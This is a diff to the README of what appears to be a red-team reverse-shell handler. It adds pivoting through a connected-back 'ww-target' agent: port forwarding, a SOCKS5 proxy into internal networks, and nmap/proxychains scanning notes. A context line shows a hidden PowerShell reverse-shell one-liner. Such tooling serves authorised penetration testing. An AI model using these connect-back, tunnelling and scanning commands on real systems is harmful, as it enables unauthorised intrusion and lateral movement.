@@ -169,6 +169,61 @@ ww targ upload -t 60 1 ./big-file.bin /tmp/big-file.bin
 ww targ cancel 1
 ```
 
+### Client — Pivoting (TCP tunnels)
+
+Reach hosts that only the **target** can reach.  Both commands dial *from*
+the `ww-target` agent; the only new listener is a local one on your machine
+(default loopback).  Requires `ww-target` **≥ 3.3.0**.
+
+```bash
+# Forward one local port: [bind:]lport:host:port (default bind 127.0.0.1)
+ww forward 1 -L 127.0.0.1:8080:10.0.0.5:80
+curl http://127.0.0.1:8080/            # reaches 10.0.0.5:80 via the target
+
+# SOCKS5 + HTTP CONNECT proxy on 127.0.0.1:1080 (same port, first-byte sniff)
+ww socks 1
+curl --socks5-hostname 127.0.0.1:1080 http://internal.corp/
+curl -x http://127.0.0.1:1080 --proxytunnel https://internal.corp/
+```
+
+`ww socks` options:
+
+| Flag | Meaning |
+|------|---------|
+| `--listen ADDR` | Listen address (default `127.0.0.1:1080`) |
+| `--local-dns` | Resolve destination names in `ww` instead of on the target |
+| `--socks-user U --socks-pass P` | Require SOCKS5 username/password (RFC 1929) |
+| `--socks-only` | Disable HTTP CONNECT; answer it with `501` |
+| `--connect-timeout SECS` | How long the target waits to connect (default 10) |
+| `--exit-on-disconnect` | Stop the listener when the target session dies |
+
+- **Remote DNS by default**: `ATYP 0x03` names are passed through and resolved
+  on the target, so internal DNS works (`proxychains` `proxy_dns = on` also works).
+  Use `--local-dns` to resolve in `ww` instead.
+- **Bind is loopback by default**; binding anywhere else prints a loud warning —
+  there is no destination ACL in v1, so the loopback bind is the real control.
+- **Limits**: 64 simultaneous streams per session (agent *and* server), 600 s
+  idle reaping (`ww-target --max-streams`, `--idle-timeout`), and the target
+  always refuses to dial the agent's own server.
+- **Session lifetime**: listeners are bound to the session id they were started
+  with.  If the target reconnects it gets a *new* id; restart the listener with
+  that id (or use `--exit-on-disconnect`).  New connections during the gap are
+  refused with SOCKS reply `0x01`.
+- **Scope**: TCP `CONNECT` only.  `BIND` and UDP `ASSOCIATE` are answered with
+  `0x07`; there is no UDP/ICMP, so QUIC, WireGuard and UDP DNS do not tunnel.
+
+#### proxychains / nmap notes
+
+- proxychains-ng sends **hostnames** and does *not* hook `shutdown()`, so plain
+  `SHUT_WR` arrives as EOF — the tunnel propagates it as a half-close instead of
+  tearing the stream down.  Its `tcp_connect_time_out` (8 s default) is honoured
+  because refused/black-holed connects answer promptly with `0x05`/`0x06`.
+- Point proxychains at an **IPv4 numeric** proxy address (`127.0.0.1`), not a
+  hostname.
+- nmap needs TCP connect scans and no ping through the proxy:
+  `nmap -sT -Pn <ip>` with either numeric IPs (`proxy_dns off`) or
+  `nmap --proxies socks4://…` style HTTP CONNECT.  UDP scan (`-sU`) cannot work.
+
 ## Control-port authentication
 
 When the TCP control port is exposed to a network (`ww-server -c`), you can
@@ -218,6 +273,13 @@ which is re-read on every connection, so key rotation needs no restart.
 ## Smart Agent (`ww-target`)
 
 `ww-target` is a lightweight Rust agent that connects back to `ww-server` on the **smart port** (default `:4446`) using a framed binary protocol.
+
+```bash
+ww-target 10.0.0.5                       # connect back and stay connected
+ww-target 10.0.0.5 --max-streams 64      # cap simultaneous tunnels (default 64)
+ww-target 10.0.0.5 --idle-timeout 600    # reap idle tunnels after N seconds
+ww-target 10.0.0.5 --no-reconnect        # exit when the session ends
+```
 
 ### Why use it over a dumb shell?
 
@@ -276,6 +338,16 @@ first time `ww-server` binds a listening port.
 | `FRAME_KEEPALIVE` | `0x07` | Bidirectional | Heartbeat |
 | `FRAME_CMD` | `0x08` | Server → Target | Execute `sh -c` command (JSON: `{seq, cmd}`) |
 | `FRAME_CMD_RESULT` | `0x09` | Target → Server | Command result (JSON: `{seq, exit_code, stdout, stderr}`) |
+| `FRAME_TUNNEL_OPEN` | `0x0A` | Server → Target | Open a tunnel stream (JSON: `{stream_id, host, port, connect_timeout}`) |
+| `FRAME_TUNNEL_OPENED` | `0x0B` | Target → Server | Tunnel open result (JSON: `{stream_id, ok, bound?, errno?, message?}`) |
+| `FRAME_TUNNEL_DATA` | `0x0C` | Bidirectional | Raw tunnel bytes (`[stream_id: u32 LE][bytes]`) |
+| `FRAME_TUNNEL_EOF` | `0x0D` | Bidirectional | Half-close one direction (`[stream_id: u32 LE]`) |
+| `FRAME_TUNNEL_CLOSE` | `0x0E` | Bidirectional | Tear down a stream (JSON: `{stream_id, reason}`) |
+
+The handshake carries an optional `features` list (absent on old peers): a `ww-target`
+that supports tunnels advertises `"tunnel"`, and the server refuses `connect` requests
+for sessions that don't. All tunnel frames are additive — older peers log an unknown
+frame type and ignore them.
 
 ### Reverse Shell One-Liners (Dumb Shells)
 
@@ -307,6 +379,7 @@ target> powershell -NoP -NonI -W Hidden -Exec Bypass -C "$c=New-Object System.Ne
 - **Deterministic command execution** — `ww-target` uses per-command `sh -c` with `wait_with_output()`, returning exact stdout, stderr, and exit code
 - **No stale output** — per-command sequence numbers in `FRAME_CMD`/`FRAME_CMD_RESULT` prevent output from bleeding between commands
 - **File transfers** — push/pull files with SHA-256 hash verification
+- **Pivoting** — `ww forward` (one port) and `ww socks` (SOCKS5 + HTTP CONNECT) dial *from* the target, so you can reach hosts only it can see; the only new listener is a loopback port on your machine
 - **Interactive mode** — full raw terminal, line editing, word navigation, Ctrl+C detach
 - **Scripting** — run command lists from files with comment and empty-line support
 - **Session persistence** — shells stay alive when you detach from interactive mode
